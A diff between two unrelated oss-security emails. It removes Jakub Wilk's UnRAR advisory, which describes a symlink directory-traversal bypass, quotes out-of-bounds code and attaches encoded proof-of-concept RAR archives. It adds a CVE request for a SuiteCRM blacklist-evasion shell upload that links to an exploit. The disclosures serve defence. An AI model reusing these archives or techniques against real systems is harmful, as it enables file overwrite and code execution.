@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["12334" "Tuesday" "15" "August" "2017" "00:39:48" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20170814223948.w4j6rsznsgixhc43@jwilk.net>" "242" "[oss-security] UnRAR: directory traversal + memory safety bugs" nil nil nil "8" "2017081422:39:48" "[oss-security] UnRAR: directory traversal + memory safety bugs" (number mark "U       jwilk@jwilk. Aug 15  242/12334 " thread-indent "\"[oss-security] UnRAR: directory traversal + memory safety bugs\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1883" "Wednesday" "20" "May" "2015" "09:48:03" "+0000" "Darren Martyn" "darren.martyn@xiphosresearch.co.uk" "<555C5853.8010903@xiphosresearch.co.uk>" "47" "[oss-security] CVE Request: SuiteCRM Post Auth RCE" nil nil nil "5" "2015052009:48:03" "[oss-security] CVE Request: SuiteCRM Post Auth RCE" (number mark "        darren.marty May 20   47/1883  " thread-indent "\"[oss-security] CVE Request: SuiteCRM Post Auth RCE\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 13508 invoked by uid 550); 14 Aug 2017 22:40:12 -0000
+Received: (qmail 1504 invoked by uid 550); 20 May 2015 14:51:03 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,262 +11,77 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 13482 invoked from network); 14 Aug 2017 22:40:10 -0000
-Date: Tue, 15 Aug 2017 00:39:48 +0200
-From: Jakub Wilk <jwilk@jwilk.net>
-To: oss-security@lists.openwall.com
-Message-ID: <20170814223948.w4j6rsznsgixhc43@jwilk.net>
-Mail-Followup-To: oss-security@lists.openwall.com
+Received: (qmail 11710 invoked from network); 20 May 2015 09:49:34 -0000
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:message-id:date:from:user-agent:mime-version:to
+         :subject:content-type;
+        bh=mca9x5bg77dAKbfh5CvdtrTfFXknNehCwJHq6F8506Q=;
+        b=QYhgeIa9RtA8kss2XbhDIUS0KtYae34HqYOi2GQAUl+Apfzo9hIZ+LAYVJrmDmFLgj
+         GKg4mnIcGWKOIdZMhXTyVWgkwptLmKDli7GQD3XAiF/EMpBEMZ7JnXqCPiF787VjufTw
+         VaKbsQYfdsw0L9UqBLCpdMtTdj6jNLjT+rK3gQXwqubIs2FjVEtYqmW4n8q6m/yjW/1M
+         3sP9ngB94IO9wkQrAgfo5ZiUbbWr8KOHa4aeymi1rGe4cy7id+Qc9o/8SS7tN1dxvSKa
+         AnHACNtiJIPJyE40NoVBLy9aBmuzqWmBmhM4XpqAyjLuoq8tptQ1bgW0G1hnju5pxdGY
+         Npag==
+X-Gm-Message-State: ALoCoQn0WFQnNISEsEmSecIhLulUE8ps4eqM5XgNeE4DT6JXKHpra2XPXiPL4yA1HfpsRPAz9E6C
+X-Received: by 10.180.20.12 with SMTP id j12mr39285417wie.4.1432115362744;
+        Wed, 20 May 2015 02:49:22 -0700 (PDT)
+Message-ID: <555C5853.8010903@xiphosresearch.co.uk>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Thunderbird/31.4.0
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="nya3btxjdrnnpce5"
-Content-Disposition: inline
-User-Agent: NeoMutt/20170609 (1.8.3)
-X-Ovh-Tracer-Id: 2791950296760768422
-X-VR-SPAMSTATE: OK
-X-VR-SPAMSCORE: 0
-X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeelkedrleeigddvtdcutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfqggfjpdevjffgvefmvefgnecuuegrihhlohhuthemuceftddtnecu
-Subject: [oss-security] UnRAR: directory traversal + memory safety bugs
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="QO8eXovbJ1H7FsFm5PESw0guVUAOjtfPf"
+Date: Wed, 20 May 2015 09:48:03 +0000
+From: Darren Martyn <darren.martyn@xiphosresearch.co.uk>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE Request: SuiteCRM Post Auth RCE
+To: oss-security@lists.openwall.com
 
---nya3btxjdrnnpce5
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Disposition: inline
-
-(I'm not sure UnRAR bugs are on-topic here. UnRAR is not free software, even 
-though the source is available. But the last time UnRAR was discussed nobody 
-objected, so hey, let me try too.)
-
-I found directory traversal and a few memory safety bugs in UnRAR 5.5.6. These 
-bugs have been fixed in UnRAR 5.5.7.
-
-The memory safety bugs were found using American Fuzzy Lop.
-
-Here are details of the bugs:
-
-* Directory traversal
-
-The PoC (traversal.rar) contains two symlinks and a regular file:
-
-   cur -> .
-   cur/par -> ..
-   par/moo
-
-This setup defeats UnRAR's directory traversal protections:
-
-   $ ls ../moo
-   /bin/ls: cannot access '../moo': No such file or directory
-
-   $ unrar x traversal.rar
-   ...
-   Extracting  cur                                                       OK
-   Extracting  cur/par                                                   OK
-   Extracting  par/moo                                                   OK
-   All OK
-
-   $ ls ../moo
-   ../moo
-
-The code that was used to generate the PoC is available here:
-https://github.com/jwilk/path-traversal-samples
-
-
-* Out-of-bounds read in Archive::ReadHeader15 / EncodeFileName::Decode
-
-The Archive::ReadHeader15 method contains the following code (with boring parts 
-omitted):
-
-   size_t NameSize=Raw.Get2();
-   // ...
-   char FileName[NM*4];
-   size_t ReadNameSize=Min(NameSize,ASIZE(FileName)-1);
-   Raw.GetB((byte *)FileName,ReadNameSize);
-   FileName[ReadNameSize]=0;
-
-   if (FileBlock)
-   {
-     if ((hd->Flags & LHD_UNICODE)!=0)
-     {
-       EncodeFileName NameCoder;
-       size_t Length=strlen(FileName);
-       Length++;
-       NameCoder.Decode(FileName,(byte *)FileName+Length,
-                        NameSize-Length,hd->FileName,
-                        ASIZE(hd->FileName));
-   // ...
-
-If NameSize is bigger than NM*4, this can make EncodeFileName::Decode read past 
-the bounds of the FileName array.
-
-PoC: oob-archive-readheader15.rar
-
-
-* Out-of-bounds reads in Unpack::Unpack20
-
-This method contains:
-
-     int DistNumber=DecodeNumber(Inp,&BlockTables.DD);
-     unsigned int Distance=DDecode[DistNumber]+1;
-
-The array size is 48; but for the PoC (oob-unpack-unpack20.rar), DistNumber is 
-58.
-
-
-* Buffer overflow in Unpack::LongLZ
-
-This method contains:
-
-   ChSetB[DistancePlace]=ChSetB[NewDistancePlace];
-
-The array size is 256; but for the PoC (oob-unpack-longlz.rar), DistancePlace 
-is 256.
-
--- 
-Jakub Wilk
-
---nya3btxjdrnnpce5
-Content-Type: application/rar
-Content-Disposition: attachment; filename="traversal.rar"
-Content-Transfer-Encoding: base64
-
-UmFyIRoHAM+QcwAADQAAAAAAAADHOHQgkCUAAQAAAAEAAAADQuLUDly75UoU
-MAMA/6EAAGN1cgDALn+GdCCQKQACAAAAAgAAAAMcFgiWXLvlShQwBwD/oQAA
-Y3VyXHBhcgDALi53MXQgkCkADAAAAAQAAAADqeIzqVy75UodMwcApIEAAHBh
-clxtb28AwAwH9I7vXZ/83/2aNMQ9ewBABwA=
-
---nya3btxjdrnnpce5
-Content-Type: application/rar
-Content-Disposition: attachment; filename="oob-archive-readheader15.rar"
+--QO8eXovbJ1H7FsFm5PESw0guVUAOjtfPf
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: quoted-printable
 
-Rar!=1A=07=00=CF=90s=00=00=0D=00=00=00=00=00=00=00H=C0t=FF=FF=FF=FF=08=00=
-=00=00=00=00=00=00=03=00=00=00=00=A2X=DBJ=1D3=FF=FF=A4=81=00=00xxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
-xxxxxxxxxxxxxxxxx=
+Hi all,
+CVE request here for a post auth RCE in the SuiteCRM (7.5.1 at least,
+probably earlier versions too, but have to get time to test those)
+software. Deadline has expired without contact from vendor, so disclosing.
 
---nya3btxjdrnnpce5
-Content-Type: application/rar
-Content-Disposition: attachment; filename="oob-unpack-unpack20.rar"
-Content-Transfer-Encoding: quoted-printable
+The vulnerability is a simple shell upload via avoiding a rather rubbish
+blacklist used to try (and fail) to prevent the upload of executable
+code. Fully automatic PoC included for testing/replicating the issue.
+Due to the fact they clearly intended to prevent upload/execution of
+executable code, I am of the view it is a vulnerability as opposed to
+abuse of functionality.
 
-Rar!=1A=07=0000s00=0D=0000000000t00*=00=A1=00=00=000000000000000=1D30000000=
-000000000=0DP=D0=CC=D7=DC=D20=C3=B40=7FL=13=87000=05=FF=FF=050=1A00=920=85=
-=DE=E5000=C1=AF=8B=930=E1=E400000000000000000000000000000000000000000000000=
-000000000000000000000000000000000000000000000000000000000000000000000000000=
-000=07=0000000=0D=0000000000t000000000000000000000=1Ai000=
 
---nya3btxjdrnnpce5
-Content-Type: application/rar
-Content-Disposition: attachment; filename="oob-unpack-longlz.rar"
-Content-Transfer-Encoding: base64
+PoC: https://github.com/XiphosResearch/exploits/tree/master/suiteshell
 
-UkV+XgQAfjAwMDAwMDANADDh//8wMAIwMA==
+Best regards,
+Darren Martyn
 
---nya3btxjdrnnpce5--
+
+--QO8eXovbJ1H7FsFm5PESw0guVUAOjtfPf
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQIcBAEBCAAGBQJVXFhTAAoJEKbzl+ujn+tWKz8P/0Y7YXcQnBEFs9sD845IrU7+
+e6+Xn3FvT8t51yPvUR1bEdIJEhRAel7/hcbeF5XvDnTt3izEzHJatYoINp7RcOA2
+AmR8CHnom8ADISsHPgI9Pj2x+4R8IN3jefenzjCj1XuczPHrNvcgSWwzGNNj7IPq
+joD1l8OsZexkx7qqOu3T1208b7p6Iknt78W4M4E/OZbRn5z+qZcBx8K7rKJVL4q0
+blRmxCa9KD+aU95nXbS7uQ+BhNkYXdKmLegcbySLfsm/DAQZJHsnDNn4qL6N5eUi
+5Ou1JhRJMvHa2APWmbWaOMZM6bksjdBQKPi4TUuFjCnlK6JZHm2Ewub6cgOuwVvI
+ZBq/Rc4PXoeGDRngccZ4ZXjDp/5K+Sib2NepIyTHXxWZl+QjnOkVxh8fu6gtzaK/
+aMgONrzCHyN1fu2XPbC5CjXmRmcMqWMa/JpZtG56sd0NLLxrEUMvwyAxT+IT8Thx
+vnHpwejbOj2cXdtkYYyDsmwmJgwdaAwYHvh7EMCDNAyXdNioyMAQrUcmCu3nRsYE
+8kIESQ35aq+87lndnqiZj5LwD24mLlHRkLAft6IltK+rrhdG2NNg8mmFNsi0FQy1
+SjIjntcjEt57w2v489c9smg5TBAqfgJC+76V8GY0furojVZntPrv+s4IdJgmifVS
+1sYqu6BvcI1X/T73I4am
+=BoBG
+-----END PGP SIGNATURE-----
+
+--QO8eXovbJ1H7FsFm5PESw0guVUAOjtfPf--
